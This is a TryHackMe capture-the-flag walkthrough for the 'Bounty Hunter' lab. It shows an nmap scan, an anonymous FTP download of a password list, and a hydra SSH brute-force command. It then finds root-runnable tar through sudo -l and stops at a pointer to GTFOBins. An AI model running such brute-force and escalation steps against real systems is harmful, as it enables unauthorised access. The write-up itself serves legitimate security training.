## Bounty Hunter TryHackMe

### Enumeration 

After a quick nmap scan we get this result:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.119.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.91 seconds



```

From the results we see that FTP service running on Port 21, SSH on Port 22 and an http server on Port 80. 

On inspection of ftp I discovered that it allow anonymous login. After logging in I discovered two files locks.txt and task.txt.

Command to login into ftp

``ftp HOST_IP``

I encountered an issue with passive mode in ftp. To fix this simply enter the command ``passive`` to disable it. 
After that we can download the files we found using ``get``. 

In the ``locks.txt`` file we seem to have a list of passwords and in `task.txt` is a message that seems to reveal a potential username we can use to login to the machine using the running ssh service.

Contents of task.txt file:
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

```

To brute force and find the correct login we can use the tool hydra and the locks.txt file as a password list. 

Hydra Command:
Using lin as the username
``hydra -s 22 -l lin -P locks.txt 10.10.14.43 ssh -t 5``

After running the command were able to find the correct ssh password for lin. 
Using these credentials we can login into the machine as the user lin. 



### Escalation 


We are able to login succesfully as lin. Now its time to escalate privileges.

Using the ``sudo -l`` command we can see what commands we can run with super(root) rights. 

```
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar



```

From the above command we can see that we can run tar commands as root. Using [GTFOBINS(https://gtfobins.github.io/)



